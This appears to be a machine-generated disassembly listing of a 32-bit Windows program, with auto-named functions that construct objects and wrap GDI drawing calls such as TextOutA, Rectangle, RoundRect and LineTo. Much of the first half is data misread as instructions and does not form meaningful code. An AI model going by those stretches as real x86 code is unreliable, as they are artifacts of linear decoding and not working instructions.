inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
add al 0x2f
jae r-xdata
inc edi
add [ edi + ebp + 0x47 ] cl
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
or dl [ esp + edx * 2 + 0x65 ]
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ edi + ebp ] al
outsd
insd
dec esp
je r-xdata
xor eax 0x35980040
inc eax
add [ ebp + esi + 0x35a00040 ] bl
je r-xdata
je r-xdata
outsd
je r-xdata
inc edx
dec edi
push es
add [ edx ] cl
push esi
jb r-xdata
add [ esp + edx * 2 ] al
imul ebp [ esp + esi * 2 + 0x54 ] 0x1c004010
add [ eax ] al
inc [ ebp + ebp + 0x47 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsd
outsd
outsb
popad
insb
push esp
adc [ eax ] al
adc [ eax ] al
add bh bh
cld
sub al 0x47
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
add eax [ eax ]
or edx [ eax + 0x65 ]
jb r-xdata
push esp
adc [ eax ] al
in al 0xd7
inc ecx
add ah ch
xlat
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
add [ eax + edx + 0x40 ] dl
add ah ah
xlat
and [ edx + 0x47 ] 0x0
xchg esp eax
jae r-xdata
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
add al 0x2f
inc edi
add [ edi + ebp + 0x47 ] cl
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
lodsb [ esi ]
das
inc edi
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ ecx ] cl
push esp
inc ebx
popad
outsb
jbe r-xdata
sbb al 0x27
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp + 0x47 ] cl
add [ eax ] ah
add [ eax ] al
add ah ah
and eax 0x358c0047
inc eax
add [ eax - 0x63ffbfcb ] bl
xor eax 0x35a00040
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ edi + ebp ] al
mov eax eax
xor [ esi ] ah
push esp
inc ebx
popad
outsb
jbe r-xdata
or [ ebp + 0x43 ] dl
jb r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
inc edi
outsd
insd
or esp [ edi + 0x64 ]
inc edx
outsd
je r-xdata
outsd
jo r-xdata
pop eax
and eax 0x670b0047
push esp
je r-xdata
add [ eax ] al
push [ ebp + ebp + 0x47 ]
jo r-xdata
popad
inc edi
add ah bl
arpl [ edi ] ax
sbb al 0x4d
inc edi
add al cl
dec edx
inc edi
add ah bl
dec edx
inc edi
add [ eax + 0x4c ] bl
inc edi
add [ edi + esi + 0x47 ] bl
add [ edi + esi + 0x51cc0047 ] bl
inc edi
add [ esi + edx * 2 + 0x47 ] ch
add [ eax ] ch
xor al [ edi ]
xchg esp eax
popad
inc edi
add al bl
dec esp
inc edi
add [ esi + ebx * 2 + 0x47 ] bl
add ah bl
aaa
inc edi
add [ edx + ecx * 2 + 0x47 ] bl
add ah ch
dec ecx
inc edi
add ah dh
dec edx
inc edi
add [ esi + esi ] al
inc edi
add [ esi + esi + 0x47 ] al
add [ esi + esi + 0x47 ] cl
add [ esp + 0x47 ] dl
add ah ch
inc edi
add [ esp + edx * 2 ] cl
push esp
inc ebx
popad
outsb
jbe r-xdata
bound eax [ edi ]
mov al [ 0xffffffff84004730 ]
xor [ edi ] al
shl [ edx + 0x47 ] 0x1
add [ edi + ecx * 2 + 0x318c0047 ] ah
inc edi
add [ edx + 0x4fd00047 ] bl
inc edi
add [ edi + edi + 0x4cf00047 ] bl
inc edi
add [ eax - 0x33ffb8bb ] ch
inc ebp
inc edi
add ah al
xor [ edi ] eax
movsb [ edi ] [ esi ]
xor [ edi ] eax
or al 0x50
inc edi
add [ ecx + esi ] ch
inc edi
add [ eax + 0x31 ] bl
inc edi
add [ eax - 0x2bffb8c1 ] al
xor [ edi ] al
add al 0x2f
inc edi
add [ edi + ebp + 0x47 ] cl
add [ eax ] dl
cmp [ edi ] eax
inc esp
cmp [ edi ] al
in al 0x31
inc edi
add [ eax + edi + 0x47 ] bh
add [ ebp + eax * 2 + 0x44540047 ] dl
inc edi
add ah ch
dec edx
inc edi
add [ esp + ecx * 2 ] ah
inc edi
add [ eax + 0x3400474c ] bh
dec ebx
inc edi
add ah ch
cmp al [ edi ]
or [ edx + 0x47 ] ah
add [ edx + 0x47 ] bh
add [ eax + 0x62 ] bh
inc edi
add [ ebx + esi + 0x47 ] bl
add ah bh
xor al [ edi ]
or al 0x3d
inc edi
add [ edi + ebp + 0x3af80047 ] ch
inc edi
add [ eax + 0x3f ] al
inc edi
add [ eax ] ah
aas
inc edi
add [ ebp + 0x391c0047 ] bh
inc edi
add ah dl
xor eax 0x47600047
inc edi
add ah bl
pop ebp
inc edi
add [ eax ] al
arpl [ edi ] ax
jo r-xdata
cwde
xor eax 0x359c0040
inc eax
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
inc esp
xor [ edi ] al
shl [ eax ] 0x47
add [ eax + 0x30 ] dh
inc edi
add al cl
xor eax 0x62c80047
inc edi
add [ eax - 0x6bffb89e ] al
inc esp
mov eax eax
movsb [ edi ] [ esi ]
sub [ edi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x29
inc edi
add al ah
add [ eax ] al
add al dl
inc edi
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
jae r-xdata
add [ eax ] bl
add [ eax ] al
add al cl
adc [ eax ] al
les esp [ esi ]
inc edi
outsd
insd
push esp
outsd
jo r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
adc [ eax ] al
and [ eax ] al
add bh bh
je r-xdata
je r-xdata
arpl [ ecx + ebp * 2 + 0x76 ] si
sti
jns r-xdata
inc esp
lea eax [ eax ]
mov esi eax
xor edx edx
mov eax esi
call sub_41d52c
mov [ esi + 0x20 ] 0x0
mov [ esi + 0x21 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0xc ] eax
mov eax esi
test bl bl
je r-xdata
jae r-xdata
outsb
add [ eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + 0x25 ] bl
inc edi
add [ ebx ] cl
push esp
outsd
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ eax ] 0x26
or esp [ edi + 0x64 ]
dec esp
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax + eax ] 0x0
pop es
inc edi
inc edi
jb r-xdata
jae r-xdata
mov [ edx ] ebx
mov edx [ eax + 0x4 ]
add edx [ eax + 0xc ]
sar edx 0x1
jns r-xdata
adc ebx 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
or eax 0x72466467
outsd
inc esi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edx
imul esp [ edi + 0x68 ] 0x66654c74
je r-xdata
imul esp [ edi + 0x68 ] 0x64670b74
mov [ ecx ] edx
pop ebx
retn
adc edx 0x0
xor al [ eax ]
xor al 0x33
inc eax
inc eax
add ah bl
xor al [ eax ]
clc
insd
inc ebx
outsb
je r-xdata
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
jb r-xdata
adc [ edi + 0x64 ] ah
inc esi
jb r-xdata
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
inc eax
insd
push esp
outsd
sub_472a0c
push ebx
mov ebx [ eax ]
add ebx [ eax + 0x8 ]
sar ebx 0x1
jns r-xdata
mov [ edx ] ebx
mov edx [ eax + 0x4 ]
add edx [ eax + 0xc ]
sar edx 0x1
jns r-xdata
adc ebx 0x0
mov [ ecx ] edx
pop ebx
retn
adc edx 0x0
sub_472a2c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41d52c
mov [ esi + 0x20 ] 0x0
mov [ esi + 0x21 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0xc ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_472a7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41d598
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x21 ]
mov [ ebx + 0x21 ] dl
mov al [ eax + 0x20 ]
mov [ ebx + 0x20 ] al
sub_472ad8
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_472a2c
xor edx edx
mov eax esi
call sub_472ab0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_472b24
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_472a2c
mov edx 0x808080
mov eax esi
call sub_41d6c0
mov dl 0x2
mov eax esi
call sub_41d7bc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_472b7c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_472a2c
mov edx 0x808080
mov eax esi
call sub_41d6c0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_472bcc
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_472a2c
mov edx 0x2
mov eax esi
call sub_41d7ec
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_472c1c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_472a2c
mov edx 0xffffff
mov eax esi
call sub_41d6c0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_472c6c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403314
mov [ edi + 0x38 ] esi
mov [ edi + 0xc ] 0x1
mov [ edi + 0x20 ] 0x64
mov [ edi + 0x24 ] 0x1
mov [ edi + 0x14 ] 0x159
mov [ edi + 0x4 ] 0x159
mov [ edi + 0x10 ] 0xf
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_472d20
push ebx
mov ebx eax
cmp edx [ ebx + 0x8 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x8 ] edx
mov eax ebx
call sub_472ccc
cmp [ ebx + 0x2a ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_472d44
push ebx
mov ebx eax
cmp edx [ ebx + 0x1c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x1c ] edx
mov eax ebx
call sub_472ccc
cmp [ ebx + 0x2a ] 0x0
je r-xdata
xor edx edx
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_472d74
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x20 ]
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov [ ebx + 0x20 ] esi
mov eax ebx
call sub_472ccc
mov edx esi
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_472da8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax + 0x4 ]
mov [ ebx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov [ ebx + 0x8 ] edx
mov dl [ eax + 0xc ]
mov [ ebx + 0xc ] dl
mov edx [ eax + 0x10 ]
mov [ ebx + 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebx + 0x14 ] edx
mov edx [ eax + 0x18 ]
mov [ ebx + 0x18 ] edx
mov edx [ eax + 0x1c ]
mov [ ebx + 0x1c ] edx
mov edx [ eax + 0x20 ]
mov [ ebx + 0x20 ] edx
mov al [ eax + 0x24 ]
mov [ ebx + 0x24 ] al
sub_472e1c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0xc ]
xor edx edx
mov eax esi
call sub_41d6c0
mov edx 0x1
mov eax esi
call sub_41d7ec
xor edx edx
mov eax esi
call sub_41d7bc
mov esi [ ebx + 0x10 ]
mov edx 0xffffff
mov eax esi
call sub_41d9c8
xor edx edx
mov eax esi
call sub_41dae4
mov esi [ ebx + 0x8 ]
xor edx edx
mov eax esi
call sub_41d1d4
mov edx 0xa
mov eax esi
call sub_41d474
mov edx 0xffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
pop esi
pop ebx
retn
sub_472e8c
push ebx
push esi
add esp 0xfffffff4
mov ebx edx
mov esi eax
cmp [ ebx + 0x21 ] 0x0
je r-xdata
mov dl 0x5
mov eax [ esi + 0xc ]
call sub_41d7bc
cmp [ ebx + 0x20 ] 0x0
je r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov eax ebx
call sub_41d7e4
dec eax
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ esp ] eax
mov eax ebx
call sub_41d6b8
call sub_41cd14
mov [ esp + 0x4 ] eax
push 0x0
push 0x0
lea eax [ esp + 0x8 ]
push eax
push 0x1
push 0x8
call ExtCreatePen
mov edx eax
mov eax [ esi + 0xc ]
call sub_41d780
jmp r-xdata
sub_472f04
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
push esp
mov eax esi
call sub_404354
push eax
mov eax esi
call sub_404554
push eax
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call GetTextExtentPoint32A
test eax eax
je r-xdata
xor eax eax
mov eax [ esp ]
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_472f4c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
push esp
mov eax esi
call sub_404354
push eax
mov eax esi
call sub_404554
push eax
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call GetTextExtentPoint32A
test eax eax
je r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_472fa3
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop esi
pop ebx
retn
sub_472fc8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403314
mov [ esi + 0xab ] 0x1
mov [ esi + 0x14 ] 0x0
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x18 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
mov [ esi + 0x91 ] 0x0
mov [ esi + 0x98 ] 0x1
mov [ esi + 0x9a ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_473044
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_473030
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403334
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_473084
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov al bl
push eax
mov eax [ esi + 0x4 ]
call sub_41e234
push eax
call SetBkMode
pop esi
pop ebx
retn
sub_4730a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41cd14
push eax
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call SetBkColor
pop esi
pop ebx
retn
sub_4730d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
call sub_41e234
mov esi eax
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x18 ]
call sub_41cd14
push eax
push esi
call SetTextColor
mov eax edi
call sub_404354
push eax
mov eax edi
call sub_404554
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call TextOutA
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_47312c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call Rectangle
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_473158
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call RoundRect
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4731a4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_4731c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
mov eax [ ebx + 0x4 ]
call sub_41e234
push eax
call LineTo
pop edi
pop esi
pop ebx
retn
sub_4731e4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x4 ]
call sub_41e234
push eax
call Rectangle
pop esi
pop ebx
retn
sub_473228
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov esi [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
call sub_4732dc
lea edx [ ebp - 0x10 ]
mov ecx esi
mov eax ebx
call sub_4732dc
lea edx [ ebp - 0x18 ]
mov ecx esi
mov eax ebx
call sub_4732dc
lea edx [ ebp - 0x20 ]
mov ecx esi
mov eax ebx
call sub_4732dc
mov eax [ ebp - 0x8 ]
mov [ ebx + 0xc0 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc4 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebx + 0xc8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebx + 0xcc ] eax
mov eax [ ebp - 0x18 ]
mov [ ebx + 0xd0 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebx + 0xd4 ] eax
mov eax [ ebp - 0x20 ]
mov [ ebx + 0xd8 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebx + 0xdc ] eax
mov eax ebx
call sub_47320c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4732fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push edx
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_473488
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x4 ] eax
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_473330
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp + 0xc ]
lea edx [ ebp - 0x4 ]
call sub_473488
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x4 ] eax
pop ebx
pop ecx
pop ebp
retn 0x8
sub_47335c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
fld [ ebx + 0xb0 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
fld [ r-xdata ]
fdiv [ ebx + 0xb0 ]
fstp [ ebp - 0x10 ]
fwait
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ ebx + 0x91 ] 0x0
je r-xdata
mov eax [ edi ]
sub eax [ ebx + 0x2c ]
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ ebp - 0x10 ]
call sub_402b00
sub eax [ ebp + 0x8 ]
add eax [ ebx + 0x20 ]
mov [ edi ] eax
mov eax [ esi ]
sub eax [ ebx + 0x30 ]
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ ebp - 0x10 ]
call sub_402b00
add eax [ ebp + 0x8 ]
add eax [ ebx + 0x24 ]
mov [ esi ] eax
jmp r-xdata
fld [ ebx + 0x70 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
